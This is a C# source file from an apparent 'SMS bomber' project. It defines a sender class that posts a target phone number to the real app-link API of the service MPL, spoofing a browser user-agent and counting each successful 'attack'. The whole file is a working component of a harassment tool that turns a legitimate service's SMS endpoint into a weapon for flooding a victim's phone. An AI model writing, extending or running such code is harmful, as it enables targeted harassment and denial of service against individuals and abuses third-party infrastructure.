using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SMS_Bomber.Sender
{
    public class MPL : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "MPL";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://www.mpl.live/api/applink");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            { Content = new FormUrlEncodedContent(new Dictionary<string, string> { { "To", To.ToString() }, { "VAR1", "DEFAULT" } }) };
            AtkMSG.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("{\"status\":200}")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
